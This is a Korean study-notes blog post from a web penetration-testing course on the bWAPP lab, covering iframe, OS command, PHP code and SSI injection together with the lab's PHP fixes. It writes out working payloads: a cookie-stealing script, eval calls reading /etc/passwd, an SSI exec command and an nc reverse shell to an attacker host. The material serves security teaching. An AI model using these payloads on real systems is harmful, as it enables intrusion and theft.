---
layout: post
title: "비박스를 활용한 웹 모의해킹 완벽 실습 - 기타 인젝션"
excerpt_separator:  <!--more-->
categories:
 - WebHack
tags:
  - 웹 해킹
  - 인프런
  - Part1 A1
  - 기타 인젝션(iframe, OS, PHP, SSI) 인젝션
---

<!--more-->

# 출처

## 인프런, 비박스를 활용한 웹 모의해킹 완벽 실습 5강 <https://www.inflearn.com/course/%EB%B9%84%EB%B0%95%EC%8A%A4-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9-%EC%8B%A4%EC%8A%B5/>

---

# 기타 인젝션(iframe, OS, PHP, SSI)

## iframe 인젝션

* iframe은 HTML 문서 안에서 또 다른 HTML을 보여주는 태그
* 한 줄에 많은 소스를 불러올 수 있고 화면에 보이지 않아 위험함
* bWApp에 iframe 인젝션 문제를 살펴보면 다음과 같음

![image](https://user-images.githubusercontent.com/28076542/51454016-e87ef100-1d85-11e9-83d4-7d527a042748.png)

```txt
ser-agent: GoodBot
Disallow:

User-agent: BadBot
Disallow: /

User-agent: *
Disallow: /admin/
Disallow: /documents/
Disallow: /images/
Disallow: /passwords/
```

### robots.txt

* 검색을 위해 정보 수집을 하는 봇들이 참고하는 텍스트 파일
* robots.txt 내용엔 검색을 허용할지 안 할지에 관한 내용이 들어있음

### 1. 페이지 소스 확인하기

```html
<div id="main">

    <h1>iFrame Injection</h1>

    <iframe frameborder="0" src="robots.txt" height="250" width="250"></iframe>

</div>
```

* iframe을 통해 robots.txt를 불러오고 있음
* URL robots.txt 뒤에 다음과 같이 iframe 태그를 삽입하면 원하는 HTML 페이지를 띄울 수 있음
* height이랑 width 속성은 자유

### 2. attack.html 만들기(Bee-Box)

```html
<script>alert(document.cookie)</script>
```

### 3. URL에 다음과 같이 주소 입력하고 결과 확인

```url
192.168.190.143/bWAPP/iframei.php?ParamUrl=robots.txt" width="250" height="250"></iframe><iframe frameborder ="0" src=attack.html width="250"></iframe>&ParamWidth=250&ParamHeight=250
```

![image](https://user-images.githubusercontent.com/28076542/51467724-90a9af80-1db0-11e9-83f0-3db9e5442a8c.png)

### 4. iframei.php 살펴보기(Bee-Box)

```php
<?php

if($_COOKIE["security_level"] == "1" || $_COOKIE["security_level"] == "2")
{
?>
    <iframe frameborder="0" src="robots.txt" height="<?php echo xss($_GET["ParamHeight"])?>" width="<?php echo xss($_GET["ParamWidth"])?>"></iframe>
<?php
}

else
{
?>
    <iframe frameborder="0" src="<?php echo xss($_GET["ParamUrl"])?>" height="<?php echo xss($_GET["ParamHeight"])?>" width="<?php echo xss($_GET["ParamWidth"])?>"></iframe>
<?php
}
?>

switch($_COOKIE["security_level"])
    {
        case "0" :
            $data = no_check($data);
            break;
        case "1" :
            $data = xss_check_4($data);
            break;
        case "2" :
            $data = xss_check_3($data);
            break;
        default :
            $data = no_check($data);
            break;
    }
    return $data;
}
```

### 5. xss_check 함수를 확인하기 위해 functions_external.php 확인하기

```php
function xss_check_1($data)

{
    // Converts only "<" and ">" to HTLM entities
    $input = str_replace("<", "&lt;", $data);
    $input = str_replace(">", "&gt;", $input);
    // Failure is an option
    // Bypasses double encoding attacks
    // <script>alert(0)</script>
    // %3Cscript%3Ealert%280%29%3C%2Fscript%3E
    // %253Cscript%253Ealert%25280%2529%253C%252Fscript%253E
    $input = urldecode($input);
    return $input;
}
function xss_check_2($data)
{
    // htmlentities - converts all applicable characters to HTML entities
    return htmlentities($data, ENT_QUOTES);
}
function xss_check_3($data, $encoding = "UTF-8")
{
    // htmlspecialchars - converts special characters to HTML entities    

    // '&' (ampersand) becomes '&amp;' 

    // '"' (double quote) becomes '&quot;' when ENT_NOQUOTES is not set

    // "'" (single quote) becomes '&#039;' (or &apos;) only when ENT_QUOTES is set

    // '<' (less than) becomes '&lt;'

    // '>' (greater than) becomes '&gt;'  
    return htmlspecialchars($data, ENT_QUOTES, $encoding);
}
function xss_check_4($data)
{
    // addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc.

    // These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).

    // Do NOT use this for XSS or HTML validations!!!
    return addslashes($data);
}
```

* xss_check_3가 제일 좋음
* htmlspecialchars() 함수 사용 권장함
* security level이 높은 iframe 문제는 위에서 했던 방식대로 하여도 쿠키가 나오지 않음

## OS Command 인젝션

* nslookup 시스템 명령어를 사용하는데 이를 OS Command로 실행할 때의 취약점을 이용

### 1. commandi.php 살펴보기(Bee-Box)

```php
else
{
    echo "<p align=\"left\">" . shell_exec("nslookup  " . commandi($target) ."</p>";
}
```

* **shell_exec** 함수는 굉장히 위험한 함수
* 파이프(`|`)를 이용하여 시스템 명령어를 사용할 수 있음

![image](https://user-images.githubusercontent.com/28076542/51468823-365e1e00-1db3-11e9-8efa-9965c405d993.png)

### 2. commandi.php의 레벨별 대응방안 확인하기

```php
switch($_COOKIE["security_level"])
    {
        case "0" :
            $data = no_check($data);
            break;
        case "1" :
            $data = commandi_check_1($data);
            break;
        case "2" :
            $data = commandi_check_2($data);
            break;
        default :
            $data = no_check($data);
            break;
    }
```

### 3. commandi_check 함수를 확인하기 위해 functions_external.php 확인하기

```php
function commandi_check_1($data)
{
    $input = str_replace("&", "", $data);
    $input = str_replace(";", "", $input);
    return $input;
}
function commandi_check_2($data)
{
    return escapeshellcmd($data);
}
function commandi_check_3($data)
{
    $input = str_replace("&", "", $data);
    $input = str_replace(";", "", $input);
    $input = str_replace("|", "", $input);
    return $input;
}
```

* **escapeshellcmd** 함수를 사용하는 것에 주목
* php 함수인데 파이프를 비롯한 특수 기호들을 처리해주는 역할을 함

## PHP code 인젝션

![image](https://user-images.githubusercontent.com/28076542/51469498-cfd9ff80-1db4-11e9-889d-b72b65a42d87.png)

* message를 누르면

![image](https://user-images.githubusercontent.com/28076542/51469636-247d7a80-1db5-11e9-835f-ca049d9ed92d.png)

### 1. PHP code 인젝션 페이지 소스코드 확인하기

```html
<div id="main">
    <h1>PHP Code Injection</h1>

    <p>This is just a test page, reflecting back your <a href="/bWAPP/phpi.php?message=test">message</a>...</p>

    <p><i>test</i></p>
</div>
```

### 2. phpi.php 확인(Bee-Box)

```php
<?php
if(isset($_REQUEST["message"]))
{
    // If the security level is not MEDIUM or HIGH
    if($_COOKIE["security_level"] != "1" && $_COOKIE["security_level"] != "2")
    {
?>
    <p><i><?php @eval ("echo " . $_REQUEST["message"] . ";");?></i></p>
```

* @eval: 내부에 있는 모든 내용을 php 코드가 처리하는 것 처럼 처리하겠다는 것

### 3. attack.php 만들기

```php
<?php
echo "ming";

@eval("echo \"ming\";");
?>
```

* 위와 아래의 출력이 동일해야 함
* 칼리리눅스의 파이어폭스에서 `http://192.168.190.143/bWAPP/attack.php`에 접속하면 다음과 같이 나옴

![image](https://user-images.githubusercontent.com/28076542/51470019-0a906780-1db6-11e9-9e60-4ae1b4e0d980.png)

* 사용자가 직접 php 코드를 작성할 수 있음을 뜻함
* 이는 시스템 함수도 작성할 수 있다는 뜻

### 4. 시스템 함수를 attack.php에 넣기

```php
<?php
echo "ming";

@eval("echo \"ming\"; system('ls');");
?>
```

![image](https://user-images.githubusercontent.com/28076542/51470753-2563db80-1db8-11e9-8a14-0ad1bc7d7036.png)

```php
<?php
echo "ming";

@eval("echo \"ming\"; system('cat /etc/passwd');");
?>
```

* 이렇게 하면 패스워드 정보가 웹 페이지에 출력됨
* 주소창에 `http://192.168.190.143/bWAPP/phpi.php?message=test; system('ls')`를 치면 똑같이 나옴

### 5. Shell 연결해주기

![image](https://user-images.githubusercontent.com/28076542/51471131-34975900-1db9-11e9-9670-3427a1a26f25.png)

### 6. 칼리리눅스에서 포트 열기

```bash
nc -l -p 666
```

* 666포트에서 리스닝하고 있어라

### 7. URL에 다음과 같이 입력하기

`http://192.168.190.143/bWAPP/phpi.php?message=test; system('nc 192.168.190.146 666 -e /bin/bash')`

![image](https://user-images.githubusercontent.com/28076542/51471459-19791900-1dba-11e9-8da7-0e5bc84ce944.png)

* 리스닝하고 있던 터미널에서 bash가 켜짐

### 8. phpi.php에서 대응방안 확인하기

```php
<?php
if(isset($_REQUEST["message"]))
{
    // If the security level is not MEDIUM or HIGH
    if($_COOKIE["security_level"] != "1" && $_COOKIE["security_level"] != "2")
    {
?>
    <p><i><?php @eval ("echo " . $_REQUEST["message"] . ";");?></i></p>
<?php
    }
    // If the security level is MEDIUM or HIGH
    else
    {
?>
    <p><i><?php echo htmlspecialchars($_REQUEST["message"], ENT_QUOTES, "UTF-8");;?></i></p>
<?php
    }
}
?>
```

* security level이 medium이나 high이면 **htmlspecialchars**를 거침
* 결론은 @eval말고 echo htmlspecialchars()를 써라

## SSI(Server Side Includes) 인젝션

![image](https://user-images.githubusercontent.com/28076542/51472168-18e18200-1dbc-11e9-830a-29cfc72367fe.png)

![image](https://user-images.githubusercontent.com/28076542/51472251-47f7f380-1dbc-11e9-9678-8d1ee52ef23f.png)

* 서버사이드쪽에서 필요한 자료를 실행하게끔 하는 인젝션

### 1. 다음 코드를 First Name에 넣기

* `<!--#echo var="DATE_LOCAL" -->`

![image](https://user-images.githubusercontent.com/28076542/51472794-db7df400-1dbd-11e9-87f2-a1964054d8da.png)

### 2. ssii.shtml, ssii.php 확인하기

```shtml
<p>Hello <!--#echo Var="DATE_LOCAL" --> Last,</p><p>Your IP address is:</p><h1><!--#echo var="REMOTE_ADDR" --></h1>
```

* 하드코딩되어 있음

```php
else
    {
        $line = '<p>Hello ' . $firstname . ' ' . $lastname . ',</p><p>Your IP address is:' . '</p><h1><!--#echo var="REMOTE_ADDR" --></h1>';
        // Writes a new line to the file
        $fp = fopen("ssii.shtml", "w");
        fputs($fp, $line, 200);
        fclose($fp);
        header("Location: ssii.shtml");
        exit;
    }
```

* 입력한 값에 대하여 하드코딩되어 저장하고 서버에서 이를 실행하여 보여주는 것

### 3. 시스템 명령어 입력해보기

* `<!--#exec cmd="ls" -->`

![image](https://user-images.githubusercontent.com/28076542/51473039-8ee6e880-1dbe-11e9-8648-d4fa14b6e02c.png)

### 4. 대책방안을 ssii.php에서 살펴보기

```php
if(isset($_POST["form"]))
{
    $firstname = ucwords(xss($_POST["firstname"]));
    $lastname = ucwords(xss($_POST["lastname"]));

    if($firstname == "" or $lastname == "")
    {
        $field_empty = 1;
    }
    else
    {
        $line = '<p>Hello ' . $firstname . ' ' . $lastname . ',</p><p>Your IP address is:' . '</p><h1><!--#echo var="REMOTE_ADDR" --></h1>';

        // Writes a new line to the file
        $fp = fopen("ssii.shtml", "w");
        fputs($fp, $line, 200);
        fclose($fp);
        header("Location: ssii.shtml");
        exit;
    }
}
```

* firstname과 lastname에 대해 xss 함수를 실행하여 xss_check 함수를 실행함
* xss_check 함수는 전에 봤듯이 **htmlspecialchars**를 씀